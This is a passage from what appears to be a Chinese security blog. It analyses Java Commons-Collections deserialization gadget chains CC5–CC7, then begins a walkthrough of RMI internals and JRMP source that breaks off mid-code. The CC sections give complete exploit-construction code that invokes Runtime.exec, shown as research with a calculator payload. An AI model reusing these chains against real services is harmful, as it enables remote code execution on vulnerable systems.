        &#125; else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) &#123;
            val = valObj.toString();
        &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
        &#125;
    &#125;
</code></pre>
<h2 id="攻击构造-1"><a href="#攻击构造-1" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC5 &#123;

    public static String fileName = &quot;CC5.bin&quot;;

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;

        // 创建 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;);

        // 创建 LazyMap 并引入 TiedMapEntry
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1azy&quot;);

        // 实例化 BadAttributeValueExpException 并反射写入
        BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;1azy&quot;);
        Field field     = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
        field.setAccessible(true);
        field.set(exception, entry);

        SerializeUtil.write(exception, fileName);
        SerializeUtil.read(fileName);
    &#125;

&#125;
</code></pre>
<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p>在 CC5 中我们使用了 <code>TiedMapEntry#toString</code> 来触发 <code>LazyMap#get</code>，在 CC6 中是通过 <code>TiedMapEntry#hashCode</code> 来触发。之前看到了 hashcode 方法也会调用 <code>getValue()</code> 方法然后调用到其中 map 的 get 方法触发 LazyMap。</p>
<p>需要一个入口触发<code>hashCode</code></p>
<h2 id="maven依赖版本-1"><a href="#maven依赖版本-1" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
    &lt;version&gt;3.1&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h2 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>HashSet 是一个无序的，不允许有重复元素的集合。HashSet 本质上就是由 HashMap 实现的。HashSet 中的元素都存放在 HashMap 的 key 上面，而 value 中的值都是统一的一个<code>private static final Object PRESENT = new Object();</code>。HashSet 跟 HashMap 一样，都是一个存放链表的数组。</p>
<p>在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。</p>
<h2 id="攻击构造-2"><a href="#攻击构造-2" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC6WithHashMap &#123;

    public static String fileName = &quot;CC6WithHashMap.bin&quot;;

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException &#123;

        // 初始化 HashMap
        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();

        // 创建 ChainedTransformer
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;

        // 创建一个空的 ChainedTransformer
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123;&#125;);

        // 创建 LazyMap 并引入 TiedMapEntry
        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1&quot;);

        hashMap.put(entry, &quot;1azy&quot;);

        //用反射再改回真的chain
        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
        f.setAccessible(true);
        f.set(fakeChain, transformers);
        //清空由于 hashMap.put 对 LazyMap 造成的影响
        lazyMap.clear();

        // 反射调用 HashMap 的 putVal 方法
//		Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();
//		for (Method method : m) &#123;
//			if (&quot;putVal&quot;.equals(method.getName())) &#123;
//				method.setAccessible(true);
//				method.invoke(hashMap, -1, entry, 0, false, true);
//			&#125;
//		&#125;

        SerializeUtil.write(hashMap, fileName);
        SerializeUtil.read(fileName);
    &#125;

&#125;
</code></pre>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC6 链分析的全部内容了，最后总结一下。</p>
<ol>
<li>利用说明：<ul>
<li>反序列化 调用 TiedMapEntry 的 toString 方法，简介调用了 LazyMap 的 hashCode 方法，触发了后续的 Transformer 恶意执行链。</li>
</ul>
</li>
<li>Gadget 总结：<ul>
<li>kick-off gadget：<code>java.util.HashSet#readObject()</code>&#x2F;<code>java.util.HashMap#readObject()</code></li>
<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
</ul>
</li>
</ol>
<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><p>寻找<code>TiedMapEntry#hashCode</code> 来触发 <code>lazysugar#put</code>，<code>Hashtable</code>满足</p>
<h2 id="maven依赖版本-2"><a href="#maven依赖版本-2" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
    &lt;version&gt;3.1&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h2 id="前置知识-5"><a href="#前置知识-5" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h3><p>Hashtable 与 HashMap 十分相似，是一种 key-value 形式的哈希表，但仍然存在一些区别：</p>
<ul>
<li>HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary ，可以说是一个过时的类。</li>
<li>两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。</li>
<li>Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key&#x3D;null 的实体放在 index&#x3D;0 的位置。</li>
<li>Hashtable 线程安全，HashMap 线程不安全。</li>
</ul>
<p>Hashtable 的 readObject 方法中，最后调用了 <code>reconstitutionPut</code> 方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里。</p>
<p><img src="/images/20230505150925.png"></p>
<p><code>reconstitutionPut</code> 调用了 key 的 hashCode 方法。</p>
<p><img src="/images/20230505150943.png"></p>
<h2 id="攻击构造-3"><a href="#攻击构造-3" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC7 &#123;

    public static String fileName = &quot;CC7.bin&quot;;

    public static void main(String[] args) throws Exception &#123;
        // 初始化 HashMap
        Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();

        // 创建 ChainedTransformer
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;open -a Calculator.app&quot;&#125;)
        &#125;;

        // 创建一个空的 ChainedTransformer
        ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]&#123;&#125;);

        // 创建 LazyMap 并引入 TiedMapEntry
        Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
        TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;1&quot;);

        hashtable.put(entry, &quot;1azy&quot;);

        //用反射再改回真的chain
        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
        f.setAccessible(true);
        f.set(fakeChain, transformers);
        //清空由于 hashtable.put 对 LazyMap 造成的影响
        lazyMap.clear();

        SerializeUtil.write(hashtable, fileName);
        SerializeUtil.read(fileName);
    &#125;
&#125;
</code></pre>
<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC7 链分析的全部内容了，最后总结一下。</p>
<ol>
<li>利用说明：<ul>
<li>用 Hashtable 代替 HashMap 触发 LazyMap 方式，与 CC6 HashMap 几乎一致。</li>
</ul>
</li>
<li>Gadget 总结：<ul>
<li>kick-off gadget：<code>java.util.Hashtable#readObject()</code></li>
<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
        <tag>反序列化</tag>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java RMI攻击原理分析</title>
    <url>/2023/04/03/Java-RMI/</url>
    <content><![CDATA[<h1 id="RMI学习"><a href="#RMI学习" class="headerlink" title="RMI学习"></a>RMI学习</h1><h2 id="RMI详解"><a href="#RMI详解" class="headerlink" title="RMI详解"></a>RMI详解</h2><p>RMI (Remote Method Invocation) 远程方法调用，是一种调用远程位置的对象来执行方法的思想。为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。<br><img src="/images/20230421212615.png"></p>
<h2 id="过程拆解"><a href="#过程拆解" class="headerlink" title="过程拆解"></a>过程拆解</h2><ol>
<li><p>创建远程对象。RemoteInterface remote &#x3D; new RemoteInterfaceImpl();</p>
</li>
<li><p>注册远程对象。registry.bind(“remote”, remote);</p>
</li>
<li><p>客户端访问服务器并查找远程对象。包括两个步骤：</p>
<p> ①用interface定义要查找的远程对象，在第四步作为引用：RemoteInterface remote &#x3D; (RemoteInterface);</p>
<p> ②查找远程对象。Naming.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;service”)</p>
</li>
<li><p>Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub</p>
</li>
<li><p>调用远程方法。remote.sayHello(“ok”)</p>
</li>
<li><p>客户端存根和服务器骨架通信</p>
</li>
<li><p>骨架代理调用remote.sayHello(“ok”);，实际上是在Server端调用的</p>
</li>
<li><p>骨架把结果返回给存根</p>
</li>
<li><p>存根把结果返回给客户端</p>
</li>
</ol>
<p>代码实现：</p>
<p>定义一个能够远程调用的接口，继承 java.rmi.Remote 接口，这个接口中的所有方法都必须声明抛出 java.rmi.<br>RemoteException 异常</p>
<pre><code>import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteInterface extends Remote &#123;
    public String sayHello(String name) throws RemoteException;
&#125;
</code></pre>
<p>创建这个远程接口的实现类，这个类中是真正的执行逻辑代码，并且继承 java.rmi.server.UnicastRemoteObject 类,童谣所有方法抛出RemoteException</p>
<blockquote>
<p>在RMI中 UnicastRemoteObject类是与Object超类等效的,该类提供了equals( ) , hashcode( ), toString( )方法,继承UnicastRemoteObject类的子类在 export 时，会随机绑定一个端口，开始监听来自客户端（Stubs）的请求，即使不注册，直接请求这个端口也可以通信。如果不想让远程对象成为 UnicastRemoteObject 的子类，后面就需要主动的使用其静态方法 exportObject 来手动 export 对象。</p>
</blockquote>
<pre><code>import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteInterfaceImpl extends UnicastRemoteObject implements RemoteInterface &#123;
    protected RemoteInterfaceImpl() throws RemoteException &#123;
        super();
    &#125;

    @Override
    public String sayHello(String name) throws RemoteException &#123;
        return &quot;Hello &quot; + name;
    &#125;
&#125;
</code></pre>
<h3 id="RMI-registry"><a href="#RMI-registry" class="headerlink" title="RMI registry"></a>RMI registry</h3><p>Java RMI 设计了一个 注册表 （RMI registry） 的思想，当想要调用某个远程对象的方法时，通过该远程对象在注册时提供在注册表（registry）中的别名（Name），来让注册表（registry）返回该远程对象的引用，后续通过该引用实现远程方法调用。由 java.rmi.registry.Registry 和 java.rmi.Naming 来实现。</p>
<p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。这个类提供的每个方法都有一个 URL 格式的参数，格式如下： <strong>&#x2F;&#x2F;host:port&#x2F;name</strong>：</p>
<ul>
<li>host 表示注册表所在的主机</li>
<li>port 表示注册表接受调用的端口号，默认为 1099</li>
<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字</li>
</ul>
<p>从下面的java.rmi.Naming#lookup源码可以看出，这些方法调用 <strong>LocateRegistry.getRegistry</strong> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的</p>
<pre><code>public static Remote lookup(String name)
    throws NotBoundException,
        java.net.MalformedURLException,
        RemoteException
&#123;
    ParsedNamingURL parsed = parseURL(name);
    Registry registry = getRegistry(parsed);

    if (parsed.name == null)
        return registry;
    return registry.lookup(parsed.name);
&#125;
</code></pre>
<p>使用 LocateRegistry#createRegistry() 方法来创建注册中心,将待调用的类进行绑定:</p>
<pre><code>import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.Naming;

public class RMIService &#123;
    public static void main(String[] args) throws Exception&#123;

        // 创建一个rmi映射表
        Registry registry = LocateRegistry.createRegistry(1099);
        // 创建一个对象
        RemoteInterface remote = new RemoteInterfaceImpl();
        // 将对象绑定到rmi注册表
        registry.bind(&quot;remote&quot;, remote);

    &#125;
&#125;
</code></pre>
<p>Client端进行调用，</p>
<pre><code>import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;

public class RMIClient &#123;
    public static void main(String[] args) throws Exception&#123;

        Registry registry_remote = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);
        System.out.println(Arrays.toString(registry_remote.list()));

        RemoteInterface remote = (RemoteInterface)registry_remote.lookup(&quot;remote&quot;);
        RemoteInterface remote2 = new RemoteInterfaceImpl();
        registry_remote.bind(&quot;remote2&quot;,remote2);
        System.out.println(remote.sayHello(&quot;ok&quot;));
    &#125;

&#125;
</code></pre>
<p>先运行RMIService，之后启动RMIClient端，成功调用了远程对象的方法。<br><img src="/images/20230422150503.png"></p>
<p>注意我们此时remote.sayHello(“ok”);传递的是String，如果我们想要传递一个类就需要知道两个概念</p>
<ol>
<li>RMI的动态加载类，java.rmi.server.codebase</li>
<li>Java SecurityManager安全管理机制</li>
</ol>
<h3 id="RMI动态加载类"><a href="#RMI动态加载类" class="headerlink" title="RMI动态加载类"></a>RMI动态加载类</h3><p>如果客户端在调用时，传递一个可序列化的对象作为参数进行传输时，在Server端肯定会对其进行反序列化。</p>
<ul>
<li>如果JVM有这个类则调用</li>
<li>如果这个对象在服务端不存在，一般服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，它可以通过远程URL去下载这个类。那么这个URL可以是http、ftp协议，加载时可以加载某个第三方类库jar包下的类，或者在指定URL时在最后以\结束来指定目录，从而通过类名加载该目录下的指定类。</li>
</ul>
<p>通过设置 <strong>java.rmi.server.codebase</strong>，则会尝试从其中的地址获取 .class 并加载及反序列化。可使用 <strong>System.setProperty(“java.rmi.server.codebase”, “<a href="http://127.0.0.1:9999/">http://127.0.0.1:9999/</a>“);</strong> 进行设置，或使用启动参数 <strong>-Djava.rmi.server.codebase&#x3D;”<a href="http://127.0.0.1:9999/">http://127.0.0.1:9999/</a>“</strong> 进行指定。</p>
<h3 id="Java-SecurityManager安全管理机制"><a href="#Java-SecurityManager安全管理机制" class="headerlink" title="Java SecurityManager安全管理机制"></a>Java SecurityManager安全管理机制</h3><blockquote>
<p>当运行未知的Java程序的时候，该程序可能有恶意代码（删除系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行的代码的权限进行控制，这时候就要启用Java安全管理器。该管理器默认是关闭的。</p>
</blockquote>
<p>而在RMI中进行动态加载类时有一个限制[1]为：</p>
<p>需要设置RMISecurityManager作为安全管理器(SecurityManager)，这样RMI时才会动态加载类。</p>
<pre><code>System.setSecurityManager(new RMISecurityManager());
</code></pre>
<p>同时需要给定一个管理策略文件，该文件以.policy结尾，内容如下可以给定全部权限</p>
<pre><code>grant &#123;
    permission java.security.AllPermission;
&#125;;
</code></pre>
<p>之后可通过读取静态资源文件的方式加载该管理策略</p>
<pre><code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());
</code></pre>
<p>那么还有一个限制[2]为：</p>
<blockquote>
<p>属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
</blockquote>
<p>动态加载类主要是分为两个场景，角色分别为Client和Server</p>
<ol>
<li>Client端接受通过RMI远程调用Server端某个方法产生的返回值，但是该返回值是个对象且Client端并没有该对象的类，那么就可以通过Server端提供的URL去动态加载类。</li>
<li>Server端在RMI过程中收到Client端传来的参数，该参数可能是个对象，如果该对象对应的类在Server端并不存在，那么就可以通过Client端提供的URL去动态加载类</li>
</ol>
<h3 id="场景一：Client端动态加载Server端Obj"><a href="#场景一：Client端动态加载Server端Obj" class="headerlink" title="场景一：Client端动态加载Server端Obj"></a>场景一：Client端动态加载Server端Obj</h3><p>RemoteInterface.java</p>
<pre><code>import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteInterface extends Remote &#123;
    public String sayHello(String name) throws RemoteException;

    String sayServerLoadClient(Object name) throws RemoteException;

    Object sayClientLoadServer() throws RemoteException;
&#125;
</code></pre>
<p>RemoteInterfaceImpl.java</p>
<pre><code>import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteInterfaceImpl extends UnicastRemoteObject implements RemoteInterface &#123;
    protected RemoteInterfaceImpl() throws RemoteException &#123;
        super();
    &#125;

    @Override
    public String sayHello(String name) throws RemoteException &#123;
        return &quot;Hello &quot; + name;
    &#125;

    @Override
    public String sayServerLoadClient(Object name) throws RemoteException &#123;
        return name.getClass().getName();
    &#125;

    @Override
    public Object sayClientLoadServer() throws RemoteException &#123;
        return new ServerObject();
    &#125;
&#125;
</code></pre>
<p>Server端待动态加载的类ServerObject.java</p>
<pre><code>import java.io.Serializable;

public class ServerObject implements Serializable &#123;
    private static final long serialVersionUID = 3274289574195395731L;
&#125;
</code></pre>
<p>RMIService.java</p>
<pre><code>import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIService &#123;
    public static void main(String[] args) throws Exception&#123;

        System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://localhost:8080/&quot;);
        // 创建一个rmi映射表
        Registry registry = LocateRegistry.createRegistry(1099);
        // 创建一个对象
        RemoteInterface remote = new RemoteInterfaceImpl();
//        registry.bind(&quot;rmi://localhost:1099/remote&quot;,remote);
        // 将对象绑定到rmi注册表
        Naming.bind(&quot;rmi://localhost:1099/remote&quot;, remote);

    &#125;
&#125;
</code></pre>
<p>RMIClient.java</p>
<pre><code>import com.study.jndi_rmi_object_injection.RemoteInterface;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.RMISecurityManager;
import java.util.Properties;

public class RMIClient &#123;
    public static void main(String[] args) throws Exception&#123;

        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);

        //设置java.security.policy属性值与RMISecurityManager
        System.setProperty(&quot;java.security.policy&quot;, RMIClient.class.getClassLoader().getResource(&quot;rmi.policy&quot;).getFile());
        System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;,&quot;false&quot;);
        System.setSecurityManager(new RMISecurityManager());

        // 创建初始化环境
        Context ctx = new InitialContext(env);
        //  jndi的方式获取远程对象
        RemoteInterface remote = (RemoteInterface) ctx.lookup(&quot;rmi://localhost:1099/remote&quot;);


        // 调用远程对象的方法
        System.out.println(remote.sayHello(&quot;ok&quot;));
        //加载Server端Obj
        System.out.println(&quot;The Class Name: &quot; + remote.sayClientLoadServer().getClass().getName());
    &#125;

&#125;
</code></pre>
<p><img src="/images/20230422002056.png"></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><ol>
<li>服务注册<br>① 远程对象创建<br>创建了一个远程对象:RemoteInterface remote &#x3D; new RemoteInterfaceImpl();这个对象继承了UnicastRemoteObject类，在初始化的时候会调用父类的构造器，实例化时会创建一个UnicastServerRef对象并调用其exportObject</li>
</ol>
<p><img src="/images/20230422122640.png"></p>
<p>其中sun.rmi.server.Util#createProxy()会调用createStub返回RemoteObjectInvocationHandler处理器处理的RemoteInterface接口实例的动态代理实例，<br><img src="/images/20230422152302.png"><br> 然后创建 sun.rmi.transport.Target 对象，这个 Target 对象封装了我们远程执行方法和Stub<br><img src="/images/20230422125236.png"><br>调用LiveRef#exportObject调用TCPEndpoint#exportObject调用this.listen()开始监听<br><img src="/images/20230422125919.png"><br>然后调用Transport#exportObject,将Target实例putTarget到ObjectTable中<br><img src="/images/20230422130210.png"><br>ObjectTable 用来管理所有发布的服务实例 Target<br>，ObjectTable 提供了根据ObjectEndpoint、Remote实例来获取Target方法</p>
<pre><code>private static final Map&lt;ObjectEndpoint, Target&gt; objTable = new HashMap();
private static final Map&lt;WeakRef, Target&gt; implTable = new HashMap();

    static Target getTarget(ObjectEndpoint var0) &#123;
    synchronized(tableLock) &#123;
        return (Target)objTable.get(var0);
    &#125;
&#125;

public static Target getTarget(Remote var0) &#123;
    synchronized(tableLock) &#123;
        return (Target)implTable.get(new WeakRef(var0));
    &#125;
&#125;
</code></pre>
<p>②注册中心创建<br>（1）new RegistryImpl(port)<br>（2）创建LiveRef对象，ep为TCPEndpoint对象包含本地ip、端口等信息<br><img src="/images/20230422135554.png"><br>封装到new UnicastServerRef对象，传递给setup方法<br><img src="/images/20230422140145.png"><br>（3）调用UnicastServerRef#exportObject，其中Util.createProxy会创建Stub存根，this.setSkeleton(var1)会创建Skeleton骨架<br><img src="/images/20230422140631.png"><br>封装为一个Target对象var6，执行this.ref.exportObject(var6)<br><img src="/images/20230422140741.png"><br>(4)调用this.listen()开始监听，创建Socket服务开启监听,调用super.exportObject(),将target添加到objTable<br><img src="/images/20230422141008.png"><br>(5)接收与处理请求</p>
<p>注册中心与远程服务对象注册的大部分流程相同，差异在：</p>
<ul>
<li>远程服务对象使用动态代理，invoke 方法最终调用 UnicastRef 的 invoke 方法，注册中心使用 RegistryImpl_Stub，同时还创建了 RegistryImpl_Skel</li>
<li>远程对象默认随机端口，注册中心默认是 1099（当然也可以指定）</li>
</ul>
<p>③ 服务注册<br>经过了一个checkAccess的检测(checkAccess就是为了检查绑定时是否是在同一个服务器上。)之后就把服务加入了this.bindings里了。<br><img src="/images/20230422153016.png"></p>
<blockquote>
<p>在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功。<br><img src="/images/20230422152930.png"></p>
</blockquote>
<ol start="2">
<li>服务发现</li>
</ol>
<h2 id="JRMI协议源码详解"><a href="#JRMI协议源码详解" class="headerlink" title="JRMI协议源码详解"></a>JRMI协议源码详解</h2><p>进入Service中的listen()方法，先调用newServerSocket方法，创建一个Serversocket，若传入的port是0，则系统会自动分配一个随机端口。然后开启了一个新线程并用上面创建的socket初始化了AcceptLoop，我们跟进AcceptLoop的run()方法.</p>
<pre><code>server = ep.newServerSocket();
/*
    * Don&#39;t retry ServerSocket if creation fails since
    * &quot;port in use&quot; will cause export to hang if an
    * RMIFailureHandler is not installed.
    */
Thread t = AccessController.doPrivileged(
    new NewThreadAction(new AcceptLoop(server),
                        &quot;TCP Accept-&quot; + port, true));
t.start();
</code></pre>
<p>跟进方法TCPTransport.AcceptLoop#run-&gt;TCPTransport.AcceptLoop#executeAcceptLoop，看到accept()函数，serversockt会停在这等待连接，当客户端连接后它又创建了一个新的线程，我们继续跟进ConnectionHandler。</p>
<pre><code>socket = serverSocket.accept();

/*
    * Find client host name (or &quot;0.0.0.0&quot; if unknown)
    */
InetAddress clientAddr = socket.getInetAddress();
String clientHost = (clientAddr != null
                        ? clientAddr.getHostAddress()
                        : &quot;0.0.0.0&quot;);

/*
    * Execute connection handler in the thread pool,
    * which uses non-system threads.
    */
try &#123;
    connectionThreadPool.execute(
        new ConnectionHandler(socket, clientHost));
&#125; catch (RejectedExecutionException e) &#123;
    closeSocket(socket);
    tcpLog.log(Log.BRIEF,
                &quot;rejected connection from &quot; + clientHost);
&#125;
</code></pre>
<p>这里看到ConnectionHandler的run()方法中又调用了run0(),其实前面说了那么多真正处理socket请求的方法就是run0(),<strong>其实这也是JRMP的实现</strong>。JRMP就是rmi底层网络传输的协议。</p>
<pre><code>public void run() &#123;
    Thread t = Thread.currentThread();
    String name = t.getName();
    try &#123;
        t.setName(&quot;RMI TCP Connection(&quot; +
                    connectionCount.incrementAndGet() +
                    &quot;)-&quot; + remoteHost);
        AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;)() -&gt; &#123;
            run0();
            return null;
        &#125;, NOPERMS_ACC);
    &#125; finally &#123;
        t.setName(name);
    &#125;
&#125;
</code></pre>
<p>第一部分是客户端发送的第一个数据包的处理部分，可以结合wireshark抓包看一下。</p>
<pre><code>private void run0() &#123;
    TCPEndpoint endpoint = getEndpoint();
    int port = endpoint.getPort();

    threadConnectionHandler.set(this);

    // set socket to disable Nagle&#39;s algorithm (always send
    // immediately)
    // TBD: should this be left up to socket factory instead?
    try &#123;
        socket.setTcpNoDelay(true);
    &#125; catch (Exception e) &#123;
        // if we fail to set this, ignore and proceed anyway
    &#125;
    // set socket to timeout after excessive idle time
    try &#123;
        if (connectionReadTimeout &gt; 0)
            socket.setSoTimeout(connectionReadTimeout);
    &#125; catch (Exception e) &#123;
        // too bad, continue anyway
    &#125;

    try &#123;
        InputStream sockIn = socket.getInputStream();
        InputStream bufIn = sockIn.markSupported()
                ? sockIn
                : new BufferedInputStream(sockIn);

        // Read magic
        DataInputStream in = new DataInputStream(bufIn);
        int magic = in.readInt();

        // read and verify transport header
        short version = in.readShort();
        if (magic != TransportConstants.Magic ||
            version != TransportConstants.Version) &#123;
            // protocol mismatch detected...
            // just close socket: this would recurse if we marshal an
            // exception to the client and the protocol at other end
            // doesn&#39;t match.
            closeSocket(socket);
            return;
        &#125;

        OutputStream sockOut = socket.getOutputStream();
        BufferedOutputStream bufOut =
            new BufferedOutputStream(sockOut);
        DataOutputStream out = new DataOutputStream(bufOut);

        int remotePort = socket.getPort();

        if (tcpLog.isLoggable(Log.BRIEF)) &#123;
            tcpLog.log(Log.BRIEF, &quot;accepted socket from [&quot; +
                                remoteHost + &quot;:&quot; + remotePort + &quot;]&quot;);
        &#125;

        TCPEndpoint ep;
        TCPChannel ch;
        TCPConnection conn;

        // send ack (or nack) for protocol
        byte protocol = in.readByte();
</code></pre>
<p><img src="/images/20230422221002.png"></p>
<p>代码中读取了三次输入流，对应wireshark红框中的三个</p>
<pre><code>int magic = in.readInt();
short version = in.readShort();
byte protocol = in.readByte();
</code></pre>
<p>然后根据protocal进入对应的case分支语句。</p>
<pre><code>switch (protocol) &#123;
    case TransportConstants.StreamProtocol:
        // send ack
        out.writeByte(TransportConstants.ProtocolAck);

        // suggest endpoint (in case client doesn&#39;t know host name)
        if (tcpLog.isLoggable(Log.VERBOSE)) &#123;
            tcpLog.log(Log.VERBOSE, &quot;(port &quot; + port +
                &quot;) &quot; + &quot;suggesting &quot; + remoteHost + &quot;:&quot; +
                remotePort);
        &#125;

        out.writeUTF(remoteHost);
        out.writeInt(remotePort);
        out.flush();

        // read and discard (possibly bogus) endpoint
        // REMIND: would be faster to read 2 bytes then skip N+4
        String clientHost = in.readUTF();
        int    clientPort = in.readInt();
        if (tcpLog.isLoggable(Log.VERBOSE)) &#123;
